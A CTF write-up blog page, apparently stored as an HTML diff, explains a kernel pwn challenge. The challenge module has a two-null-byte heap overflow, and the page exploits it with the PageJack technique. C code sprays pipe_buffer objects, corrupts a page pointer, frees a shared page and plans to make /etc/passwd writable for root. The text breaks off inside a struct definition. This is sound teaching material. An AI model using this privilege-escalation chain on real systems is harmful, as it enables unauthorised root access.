@@ -1,0 +1,450 @@
+<!DOCTYPE html>
+<html lang="en"><head>
+    <title>Kernels and Cats</title>
+    <meta content="text/html;charset=utf-8" http-equiv="Content-Type">
+    <meta content="utf-8" http-equiv="encoding">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta name="format-detection" content="telephone=no" />
+    <meta name="theme-color" content="#000084" />
+    <meta name="google-site-verification" content="733C7I2uDZnatcput9zZupeQ_PX5Z0BJ1HmTnGi0SJI" />
+    <link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png">
+	<link rel="icon" type="image/png" sizes="32x32" href="/favicon-32x32.png">
+	<link rel="icon" type="image/png" sizes="16x16" href="/favicon-16x16.png">
+	<link rel="manifest" href="/site.webmanifest">
+	<link rel="icon" href="https://kaligulaarmblessed.github.io//favicon.ico">
+    <link rel="canonical" href="https://kaligulaarmblessed.github.io/">
+    
+    
+</head>
+<body>
+<nav class="navbar navbar-inverse navbar-fixed-top">
+    <div class="navbar-inner">
+        <div class="container">
+            <button type="button" class="btn btn-navbar" data-toggle="collapse" data-target=".nav-collapse"></button>
+            <a class="brand" href="https://kaligulaarmblessed.github.io/">Kernels and Cats</a>
+            <div class="nav-collapse collapse">
+                <ul class="nav">
+                    
+                    
+                        
+                            <li>
+                                <a href="/about/">
+                                    
+                                    <span>About</span>
+                                </a>
+                            </li>
+                        
+                    
+                        
+                            <li>
+                                <a href="/post/">
+                                    
+                                    <span>Posts</span>
+                                </a>
+                            </li>
+                        
+                    
+                        
+                            <li>
+                                <a href="/cves/">
+                                    
+                                    <span>CVEs</span>
+                                </a>
+                            </li>
+                        
+                    
+                        
+                            <li>
+                                <a href="/challenges/">
+                                    
+                                    <span>CTF Challenges</span>
+                                </a>
+                            </li>
+                        
+                    
+                        
+                            <li>
+                                <a href="/lab-compendium/">
+                                    
+                                    <span>Lab Compendium</span>
+                                </a>
+                            </li>
+                        
+                    
+                        
+                            <li>
+                                <a href="/random-facts/">
+                                    
+                                    <span>Random Fun Facts</span>
+                                </a>
+                            </li>
+                        
+                    
+                </ul>
+            </div>
+        </div>
+    </div>
+</nav><div id="content" class="container">
+
+<div class="row-fluid navmargin">
+    <div class="page-header">
+        <h1>Utility Pole: Revengeance -- PageJack [LNC 5.0] - Fri, Jul 11, 2025</h1>
+    </div>
+    <p class="lead"></p>
+    <h4 id="tldr">TLDR</h4>
+<p>Utility Pole: Revenge (Pt. 1) and Utility Pole: Revengeance (Pt. 2) are a series of collab challenges written by <a href="https://github.com/adaisyx">Lambda</a> and I for LNC 5.0. Part 1 (written by Lambda) was a geo-OSINT challenge where players had to identify the locations of 10 utility poles, and part 2 (written by me) was a kernel pwn challenge. The vulnerability was a 2 null-byte heap overflow, which can be utilized for privilege escalation by employing the PageJack technique.</p>
+<h4 id="table-of-contents">Table of Contents</h4>
+<ol>
+<li><a href="#the-story-behind-utility-pole-revengeance">The Story Behind Utility Pole: Revengeance</a></li>
+<li><a href="#challenge-descriptions">Challenge Descriptions</a></li>
+<li><a href="#module-functionality">Module Functionality</a></li>
+<li><a href="#pagejack">PageJack</a></li>
+<li><a href="#my-favourite-challenge">My Favourite Challenge</a></li>
+<li><a href="#references-and-credits">References and Credits</a></li>
+</ol>
+<h4 id="the-story-behind-utility-pole-revengeance">The Story Behind Utility Pole: Revengeance</h4>
+<p>Some of you might know that I am a very big fan of Metal Gear Rising: Revengeance (see <a href="https://kaligulaarmblessed.github.io/post/dead-pwners-society/">Dead Pwners&rsquo; Society</a>, <a href="https://kaligulaarmblessed.github.io/challenges/standcon2025-bigbangtheory/">Big Bang Theory</a>, etc). In MGR, during one of the boss fights, evil corporation Desperado&rsquo;s leader, Sundowner, fights with main character Raiden (whose real name is Jack) by chopping down a utility pole and swinging it at him:</p>
+<p><img src="/images/utilitypole-revengeance/utilitypole.png" alt="The utility pole man himself"></p>
+<p>(Yes, I went to play MGR to get these screenshots)</p>
+<p>I found this stupidly funny, so as any sane person would do, I turned it into a CTF challenge for AYCEP CTF 2024: <a href="https://github.com/KaligulaArmblessed/CTF-Challenges/tree/main/AYCEP_2024/utilitypole">utilitypole</a>. However, as I have never written an OSINT challenge before, utilitypole V1™ turned out to be guessy and way more difficult than I&rsquo;ve expected (whoops). Some reactions on Discord for example:</p>
+<img src="/images/utilitypole-revengeance/discord_reactions.jpg" alt="Discord reactions" width="600" style="margin-bottom: 20px;"/>
+<p>Since I have written challenges for LNC CTF last year, I thought that it would be funny if a second version of the utility pole challenge was <strong>disguised as an OSINT, only for the players to be greeted with a kernel pwn challenge once they have solved the geoguessr part</strong>. So, I called OSINT legend Lambda (who spent 18 hours solving a geo-OSINT challenge where the only clues were a road and a butterfly 🦋 &ndash; she found the exact location btw) to craft the geoguessr segment of the challenge, while I wrote the kernel pwn. I&rsquo;ve always wanted to write a PageJack challenge (and totally not because I want to make a stupid MGR joke), hence this challenge came into being.</p>
+<h4 id="challenge-descriptions">Challenge Descriptions</h4>
+<p><strong>Utility Pole: Revenge (Pt. 1)</strong></p>
+<blockquote>
+<p>ROP LLC. has attracted spies ever since our website became popular&hellip; too popular. Now all communications must be guarded. Do you know enough about utility poles to pinpoint 10 locations and pass the security check? Make haste, for if you manage to bypass the security check before the next wave, our CISO will grant you early access to our newest data center, as well as crucial company secrets that would aid your journey.</p></blockquote>
+<p>This part of the challenge was written by <strong>Lambda</strong> &ndash; you can see her full writeup <a href="https://github.com/Lag-and-Crash/2025/blob/main/challenges/osint/utilitypole_revenge/solution/writeup.md">here</a>. (Every utility pole is also based on an MGR reference which is simply peak 🔥🔥)</p>
+<p><strong>Utility Pole: Secret Data (Pt. 1.5)</strong></p>
+<p>The challenge was designed such that both Revenge (Pt. 1) and Revengeance (Pt. 2) can be solved independently, but if you solve part 1, you will get access to the source code (which is the secret data in this case) of the kernel module.</p>
+<p><strong>Utility Pole: Revengeance (Pt. 2)</strong></p>
+<blockquote>
+<p>ROP LLC.&rsquo;s new data center is managed by sysadmin Jack, who spends all of his time turning the pages of his books instead of securing the server. As one of our trusted operatives, surely you can root the server and show Jack that he should stop laughing at cat memes during company hours? Login credentials are <code>jack:jack</code>, and the flag is in <code>/dev/sdb</code>.</p></blockquote>
+<p>The user is called <code>Jack</code>, and he&rsquo;s turning the <code>pages</code> of his books, because <code>PageJack</code>, get it? (I will see myself out now&hellip;)</p>
+<h4 id="module-functionality">Module Functionality</h4>
+<p>This module is pretty simple and only has two functions: CREATE_SECRET_MESSAGE and WRITE_SECRET_MESSAGE. The challenge is designed such that create and write can only be called one time each.</p>
+<p><strong>CREATE_SECRET_MESSAGE: 0xc010ca00</strong></p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-C" data-lang="C"><span style="display:flex;"><span>        <span style="color:#66d9ef">case</span> CREATE_SECRET_MESSAGE: {
+</span></span><span style="display:flex;"><span>            size <span style="color:#f92672">=</span> user_data.size; 
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">if</span> (secret_message_created <span style="color:#f92672">==</span> <span style="color:#ae81ff">1</span>) {
+</span></span><span style="display:flex;"><span>                <span style="color:#a6e22e">pr_info</span>(<span style="color:#e6db74">&#34;Secret message has already been created!</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>); 
+</span></span><span style="display:flex;"><span>                <span style="color:#a6e22e">mutex_unlock</span>(<span style="color:#f92672">&amp;</span>mod_mutex);
+</span></span><span style="display:flex;"><span>                <span style="color:#66d9ef">return</span> <span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>; 
+</span></span><span style="display:flex;"><span>                <span style="color:#66d9ef">break</span>;
+</span></span><span style="display:flex;"><span>               }
+</span></span><span style="display:flex;"><span>            secret_msg <span style="color:#f92672">=</span> <span style="color:#a6e22e">kzalloc</span>(<span style="color:#66d9ef">sizeof</span>(<span style="color:#66d9ef">struct</span> secret_message), GFP_KERNEL_ACCOUNT);
+</span></span><span style="display:flex;"><span>            message_buf <span style="color:#f92672">=</span> <span style="color:#a6e22e">kzalloc</span>(size <span style="color:#f92672">*</span> <span style="color:#ae81ff">2</span>, GFP_KERNEL_ACCOUNT); 
+</span></span><span style="display:flex;"><span>            secret_msg<span style="color:#f92672">-&gt;</span>size <span style="color:#f92672">=</span> size; 
+</span></span><span style="display:flex;"><span>            secret_msg<span style="color:#f92672">-&gt;</span>message <span style="color:#f92672">=</span> (<span style="color:#66d9ef">uint64_t</span>)message_buf; 
+</span></span><span style="display:flex;"><span>            <span style="color:#a6e22e">pr_info</span>(<span style="color:#e6db74">&#34;Secret message created!</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>); 
+</span></span><span style="display:flex;"><span>            secret_message_created <span style="color:#f92672">=</span> <span style="color:#ae81ff">1</span>;
+</span></span><span style="display:flex;"><span>            <span style="color:#a6e22e">mutex_unlock</span>(<span style="color:#f92672">&amp;</span>mod_mutex); 
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">return</span> <span style="color:#ae81ff">0</span>; 
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">break</span>;
+</span></span><span style="display:flex;"><span>        }
+</span></span></code></pre></div><p>If a secret message has not been previously created, it will allocate a struct secret_message object in the kmalloc-cg-16 cache. It then takes the size provided by the user (maximum allowed size by the module is 0x400 and size cannot be 0x0) and allocates a buffer of size × 2 in a cg cache. Finally, it sets the size and message variables in secret_msg, sets global variable secret_message_created to 1, unlocks the mutex and returns.</p>
+<p><strong>WRITE_SECRET_MESSAGE: 0xc010ca01 and the Bug 🪲</strong></p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-C" data-lang="C"><span style="display:flex;"><span>        <span style="color:#66d9ef">case</span> WRITE_SECRET_MESSAGE: {
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">if</span> (secret_message_written <span style="color:#f92672">==</span> <span style="color:#ae81ff">1</span>) {
+</span></span><span style="display:flex;"><span>                <span style="color:#a6e22e">pr_info</span>(<span style="color:#e6db74">&#34;Secret message has already been written!</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>); 
+</span></span><span style="display:flex;"><span>                <span style="color:#a6e22e">mutex_unlock</span>(<span style="color:#f92672">&amp;</span>mod_mutex); 
+</span></span><span style="display:flex;"><span>                <span style="color:#66d9ef">return</span> <span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>; 
+</span></span><span style="display:flex;"><span>                <span style="color:#66d9ef">break</span>;
+</span></span><span style="display:flex;"><span>            }
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">if</span> (secret_message_created <span style="color:#f92672">==</span> <span style="color:#ae81ff">0</span> <span style="color:#f92672">||</span> secret_msg <span style="color:#f92672">==</span> <span style="color:#ae81ff">0</span>) {
+</span></span><span style="display:flex;"><span>                <span style="color:#a6e22e">pr_info</span>(<span style="color:#e6db74">&#34;Secret message does not exist!</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>); 
+</span></span><span style="display:flex;"><span>                <span style="color:#a6e22e">mutex_unlock</span>(<span style="color:#f92672">&amp;</span>mod_mutex); 
+</span></span><span style="display:flex;"><span>                <span style="color:#66d9ef">return</span> <span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>; 
+</span></span><span style="display:flex;"><span>                <span style="color:#66d9ef">break</span>; 
+</span></span><span style="display:flex;"><span>            }
+</span></span><span style="display:flex;"><span>            size <span style="color:#f92672">=</span> secret_msg<span style="color:#f92672">-&gt;</span>size; 
+</span></span><span style="display:flex;"><span>            ret <span style="color:#f92672">=</span> <span style="color:#a6e22e">copy_from_user</span>(buf, (<span style="color:#66d9ef">void</span> __user <span style="color:#f92672">*</span>) user_data.message, size);
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">for</span> (<span style="color:#66d9ef">int</span> i <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>; i <span style="color:#f92672">&lt;</span> size; i<span style="color:#f92672">++</span>) {
+</span></span><span style="display:flex;"><span>                ((<span style="color:#66d9ef">uint16_t</span><span style="color:#f92672">*</span>)secret_msg<span style="color:#f92672">-&gt;</span>message)[i] <span style="color:#f92672">=</span> buf[i]; <span style="color:#75715e">// [1]
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>            }
+</span></span><span style="display:flex;"><span>            ((<span style="color:#66d9ef">uint16_t</span><span style="color:#f92672">*</span>)secret_msg<span style="color:#f92672">-&gt;</span>message)[size] <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x0</span>; <span style="color:#75715e">// [2]
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>            <span style="color:#a6e22e">pr_info</span>(<span style="color:#e6db74">&#34;Secret message written!</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>);
+</span></span><span style="display:flex;"><span>            secret_message_written <span style="color:#f92672">=</span> <span style="color:#ae81ff">1</span>; 
+</span></span><span style="display:flex;"><span>            <span style="color:#a6e22e">mutex_unlock</span>(<span style="color:#f92672">&amp;</span>mod_mutex); 
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">return</span> <span style="color:#ae81ff">0</span>; 
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">break</span>;
+</span></span><span style="display:flex;"><span>        }
+</span></span></code></pre></div><p>WRITE_SECRET_MESSAGE first checks that a write has not been previously performed, but a secret message has been created and that secret_msg is not 0x0. It will then copy the user&rsquo;s input of size secret_msg-&gt;size into a buffer, before perfoming a copy that is akin to converting a normal ASCII string into a unicode string ([1]). Finally, the string is terminated by adding a unicode 0x0 (which is equivalent to 2 null bytes &ndash; [2]).</p>
+<p>However, there is an off-by-one (two?) vulnerability in the string termination &ndash; the index used is <code>size</code> instead of <code>size - 1</code>, resulting in two null bytes being written out of bounds. Usually, being able to write two null bytes out of bounds is very easily exploitable using struct msg_msg objects (for example), unless&hellip;</p>
+<p><strong>Kernel Protections</strong></p>
+<p>All usual kernel protections (KASLR, SMAP, SMEP, KPTI) have been enabled for this challenge, as well as:</p>
+<ul>
+<li>CONFIG_CFI_CLANG=y: Control flow integrity &ndash; Prevents ROP</li>
+<li>CONFIG_STATIC_USERMODEHELPER=y: No modprobe path overwrite</li>
+<li>CONFIG_SLAB_FREELIST_HARDENED=y: Mangles the freelist pointer via 2 XOR operations</li>
+<li>CONFIG_SLAB_FREELIST_RANDOM=y: Randomizes the freelist order used on creating new pages</li>
+<li>CONFIG_LIST_HARDENED=y: List protections</li>
+<li>CONFIG_SYSVIPC=n: No msg_msg objects &gt;:)</li>
+<li>CONFIG_SLAB_MERGE_DEFAULT=n: Slab merging is disabled</li>
+</ul>
+<h4 id="pagejack">PageJack</h4>
+<p><a href="https://i.blackhat.com/BH-US-24/Presentations/US24-Qian-PageJack-A-Powerful-Exploit-Technique-With-Page-Level-UAF-Thursday.pdf">PageJack</a> is a leakless kernel exploitation technique that can bypass CONFIG_SLAB_VIRTUAL and CFI. The technique first appeared in <a href="https://github.com/arttnba3/D3CTF2023_d3kcache">d3kcache (D^3CTF 2023)</a>, which was written by <a href="https://github.com/arttnba3">arttnba3</a>. The gist is to corrupt an object which contains a struct page pointer, after which page level UAF can be obtained. The freed page can then be reallocated by spraying another object (e.g. file, cred), which can then be further corrupted to obtain privilege escalation.</p>
+<p>So here is our exploit plan:</p>
+<ol>
+<li>Spray some struct pipe_buf</li>
+<li>Allocate the vulnerable object</li>
+<li>Spray more struct pipe_buf</li>
+<li>Trigger the vulnerability &ndash; perform 2 null-byte overflow into the struct page pointer in pipe_buf</li>
+<li>Find the corrupted pipes</li>
+<li>Close one of the corrupted pipes</li>
+<li>Spray struct file by opening /etc/passwd</li>
+<li>Make /etc/passwd writable</li>
+<li>Set root password and PROFIT</li>
+</ol>
+<p>Firstly, let&rsquo;s take a look at struct pipe_buf:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-C" data-lang="C"><span style="display:flex;"><span><span style="color:#66d9ef">struct</span> pipe_buffer {
+</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">struct</span> page <span style="color:#f92672">*</span>page;
+</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">int</span> offset, len;
+</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">const</span> <span style="color:#66d9ef">struct</span> pipe_buf_operations <span style="color:#f92672">*</span>ops;
+</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">int</span> flags;
+</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">long</span> private;
+</span></span><span style="display:flex;"><span>};
+</span></span></code></pre></div><p>struct pipe_buffer is allocated in kmalloc-cg-1024 as a ring of pipe_buffer structs. Each pipe_buffer object has a pointer to struct page, which is the struct that handles the physical page which contains the data inside the pipe.</p>
+<p>Currently, we know that we are able to control the size of the secret message buffer allocated, and that we have a 2 null-byte overflow in that buffer. With this 2 null-byte overwrite, we can partially overwrite the struct page pointer inside a pipe_buffer object such that two pipe_bufs have pointers to the same page. Once we have achieved that, we can cause a page-level UAF by simply closing one of the pipes.</p>
+<p>Let&rsquo;s first set up the heap by spraying some pipe_buffer objects, allocating the secret message buffer, and spraying more pipe_buffer objects after that:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-C" data-lang="C"><span style="display:flex;"><span>    <span style="color:#75715e">// Spray half of the pipefds
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    <span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">&#34;[+] Spraying half of the pipefds</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>);
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">int</span> write_number <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>; 
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">for</span> (<span style="color:#66d9ef">int</span> i <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>; i <span style="color:#f92672">&lt;</span> NUM_PIPEFDS<span style="color:#f92672">/</span><span style="color:#ae81ff">2</span>; i<span style="color:#f92672">++</span>) {
+</span></span><span style="display:flex;"><span>        write_number <span style="color:#f92672">=</span> i; 
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">pipe</span>(pipefd[i]) <span style="color:#f92672">&lt;</span> <span style="color:#ae81ff">0</span>) {
+</span></span><span style="display:flex;"><span>            <span style="color:#a6e22e">perror</span>(<span style="color:#e6db74">&#34;[!] pipe&#34;</span>);
+</span></span><span style="display:flex;"><span>            <span style="color:#a6e22e">exit</span>(<span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>);
+</span></span><span style="display:flex;"><span>        }
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">write</span>(pipefd[i][<span style="color:#ae81ff">1</span>], <span style="color:#f92672">&amp;</span>write_number, <span style="color:#66d9ef">sizeof</span>(<span style="color:#66d9ef">int</span>)) <span style="color:#f92672">&lt;</span> <span style="color:#ae81ff">0</span>) {
+</span></span><span style="display:flex;"><span>            <span style="color:#a6e22e">perror</span>(<span style="color:#e6db74">&#34;[!] write&#34;</span>);
+</span></span><span style="display:flex;"><span>            <span style="color:#a6e22e">exit</span>(<span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>);
+</span></span><span style="display:flex;"><span>        }
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">write</span>(pipefd[i][<span style="color:#ae81ff">1</span>], <span style="color:#e6db74">&#34;AAAAAAAA&#34;</span>, <span style="color:#ae81ff">8</span>) <span style="color:#f92672">&lt;</span> <span style="color:#ae81ff">0</span>) {
+</span></span><span style="display:flex;"><span>            <span style="color:#a6e22e">perror</span>(<span style="color:#e6db74">&#34;[!] write&#34;</span>);
+</span></span><span style="display:flex;"><span>            <span style="color:#a6e22e">exit</span>(<span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>);
+</span></span><span style="display:flex;"><span>        }
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#75715e">// Allocate victim 
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    <span style="color:#a6e22e">do_create</span>(<span style="color:#ae81ff">0x200</span>, buf);
+</span></span><span style="display:flex;"><span>    
+</span></span><span style="display:flex;"><span>    <span style="color:#75715e">// Spray second half of pipefds
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    <span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">&#34;[+] Spraying half of the pipefds</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>);
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">for</span> (<span style="color:#66d9ef">int</span> i <span style="color:#f92672">=</span> NUM_PIPEFDS<span style="color:#f92672">/</span><span style="color:#ae81ff">2</span>; i <span style="color:#f92672">&lt;</span> NUM_PIPEFDS; i<span style="color:#f92672">++</span>) {
+</span></span><span style="display:flex;"><span>        write_number <span style="color:#f92672">=</span> i; 
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">pipe</span>(pipefd[i]) <span style="color:#f92672">&lt;</span> <span style="color:#ae81ff">0</span>) {
+</span></span><span style="display:flex;"><span>            <span style="color:#a6e22e">perror</span>(<span style="color:#e6db74">&#34;[!] pipe&#34;</span>);
+</span></span><span style="display:flex;"><span>            <span style="color:#a6e22e">exit</span>(<span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>);
+</span></span><span style="display:flex;"><span>        }
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">write</span>(pipefd[i][<span style="color:#ae81ff">1</span>], <span style="color:#f92672">&amp;</span>write_number, <span style="color:#66d9ef">sizeof</span>(<span style="color:#66d9ef">int</span>)) <span style="color:#f92672">&lt;</span> <span style="color:#ae81ff">0</span>) {
+</span></span><span style="display:flex;"><span>            <span style="color:#a6e22e">perror</span>(<span style="color:#e6db74">&#34;[!] write&#34;</span>);
+</span></span><span style="display:flex;"><span>            <span style="color:#a6e22e">exit</span>(<span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>);
+</span></span><span style="display:flex;"><span>        }
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">write</span>(pipefd[i][<span style="color:#ae81ff">1</span>], <span style="color:#e6db74">&#34;AAAAAAAA&#34;</span>, <span style="color:#ae81ff">8</span>) <span style="color:#f92672">&lt;</span> <span style="color:#ae81ff">0</span>) {
+</span></span><span style="display:flex;"><span>            <span style="color:#a6e22e">perror</span>(<span style="color:#e6db74">&#34;[!] write&#34;</span>);
+</span></span><span style="display:flex;"><span>            <span style="color:#a6e22e">exit</span>(<span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>);
+</span></span><span style="display:flex;"><span>        }
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">sleep</span>(<span style="color:#ae81ff">1</span>); 
+</span></span></code></pre></div><p>This is how the heap looks like:</p>
+<p><img src="/images/utilitypole-revengeance/heap1.jpg" alt="heap"></p>
+<p>Once the heap has been fengshui-ed (yes that&rsquo;s what it&rsquo;s actually called), we can perform our two null-byte overwrite (<code>do_write(0x200, buf);</code>) so that the heap looks like this:</p>
+<p><img src="/images/utilitypole-revengeance/heap2.jpg" alt="heap heap"></p>
+<p>At this point, we have two different pipes that have the same struct page pointer (and hence use the same physical page for pipe data). We can determine which of the pipes these are by reading from all the pipes to see which ones have been corrupted:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-C" data-lang="C"><span style="display:flex;"><span>    <span style="color:#66d9ef">int</span> number <span style="color:#f92672">=</span> <span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>; 
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">&#34;[+] Find corrupted pipe</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>); 
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">for</span> (<span style="color:#66d9ef">int</span> i <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>; i <span style="color:#f92672">&lt;</span> NUM_PIPEFDS; i<span style="color:#f92672">++</span>) {
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">read</span>(pipefd[i][<span style="color:#ae81ff">0</span>], <span style="color:#f92672">&amp;</span>number, <span style="color:#66d9ef">sizeof</span>(<span style="color:#66d9ef">int</span>)) <span style="color:#f92672">&lt;</span> <span style="color:#ae81ff">0</span>) {
+</span></span><span style="display:flex;"><span>            <span style="color:#a6e22e">perror</span>(<span style="color:#e6db74">&#34;[!] read&#34;</span>); 
+</span></span><span style="display:flex;"><span>            <span style="color:#a6e22e">exit</span>(<span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>);
+</span></span><span style="display:flex;"><span>        }
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> (i <span style="color:#f92672">!=</span> number) {
+</span></span><span style="display:flex;"><span>            corrupted_pipe_1 <span style="color:#f92672">=</span> number; 
+</span></span><span style="display:flex;"><span>            corrupted_pipe_2 <span style="color:#f92672">=</span> i; 
+</span></span><span style="display:flex;"><span>            <span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">&#34;[+] Found corrupted pipes: 0x%x and 0x%x</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>, corrupted_pipe_1, corrupted_pipe_2); 
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">break</span>; 
+</span></span><span style="display:flex;"><span>        }
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> (corrupted_pipe_1 <span style="color:#f92672">==</span> <span style="color:#f92672">-</span><span style="color:#ae81ff">1</span> <span style="color:#f92672">||</span> corrupted_pipe_2 <span style="color:#f92672">==</span> <span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>) {
+</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">&#34;[!] Unable to find corrupted pipe</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>); 
+</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">exit</span>(<span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>);
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">sleep</span>(<span style="color:#ae81ff">1</span>); 
+</span></span></code></pre></div><p>Now, we will close one of the pipes, which will free the page, giving us page-level UAF:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-C" data-lang="C"><span style="display:flex;"><span>    <span style="color:#75715e">// Free the page
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    <span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">&#34;[+] Get UAF on the page</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>); 
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">close</span>(pipefd[corrupted_pipe_1][<span style="color:#ae81ff">0</span>]);
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">close</span>(pipefd[corrupted_pipe_1][<span style="color:#ae81ff">1</span>]); 
+</span></span></code></pre></div><p><img src="/images/utilitypole-revengeance/heap3.jpg" alt="heapy heap heap"></p>
+<p>Now, all that&rsquo;s left to do is to reclaim the page by spraying some critical struct that we can corrupt to achieve privilege escalation. In this case, I chose to spray struct file for /etc/passwd, as corrupting f_mode inside struct file will make /etc/passwd writable and allow me to change the root password. There are other ways of doing this, such as by spraying and corrupting struct cred in a DirtyCred type attack.</p>
+<p>Let&rsquo;s take a look at struct file:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-C" data-lang="C"><span style="display:flex;"><span><span style="color:#66d9ef">struct</span> file {
+</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">atomic_long_t</span>			f_count;
+</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">spinlock_t</span>			f_lock;
+</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">fmode_t</span>				f_mode; <span style="color:#75715e">// Controls read/write permissions
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>	<span style="color:#66d9ef">const</span> <span style="color:#66d9ef">struct</span> file_operations	<span style="color:#f92672">*</span>f_op;
+</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">struct</span> address_space		<span style="color:#f92672">*</span>f_mapping;
+</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">void</span>				<span style="color:#f92672">*</span>private_data;
+</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">struct</span> inode			<span style="color:#f92672">*</span>f_inode;
+</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">int</span>			f_flags;
